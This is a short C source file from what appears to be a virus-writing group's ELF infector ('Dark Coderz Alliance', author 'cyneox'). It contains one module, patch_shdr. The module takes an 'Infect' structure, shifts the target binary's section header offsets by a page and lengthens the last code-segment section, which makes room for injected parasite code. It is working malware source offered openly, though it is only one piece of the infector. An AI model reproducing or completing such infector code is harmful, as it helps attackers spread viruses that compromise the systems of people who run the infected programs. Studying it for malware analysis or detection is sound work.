/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/

/*
     Description : patching SHDR ( Sections Header ) 
*/


#include "../defines.h"

int patch_shdr(Infect *file)
{
	Elf32_Shdr *shdr;
	off_t end_of_cs;
	unsigned int num;
	
	/* move to first entry in the SHDR */
	shdr=(Elf32_Shdr*)(file->mmap.start + file->mmap.ehdr->e_shoff);
	
	end_of_cs=file->end_of_codes;
	
	for(num=file->mmap.ehdr->e_shnum; num >0; num--,shdr++)
	{
		if(shdr->sh_offset>=end_of_cs)
		{
			/* update SHDR offsets... */
			shdr->sh_offset += ELF_PAGE_SZ;
		}
		else if(shdr->sh_offset + shdr->sh_size == end_of_cs)
		{
			/* increasing lenght of .rodata (last section of code segment) */
			shdr->sh_size += ELF_PAGE_SZ;
			
		}
	}
	
	file->mmap.ehdr->e_shoff += ELF_PAGE_SZ;
	
	printf("__ [ patch _ shdr ] __\n");
	printf("new e_shoff = %d\n",file->mmap.ehdr->e_shoff);
	
	return true;
}
	
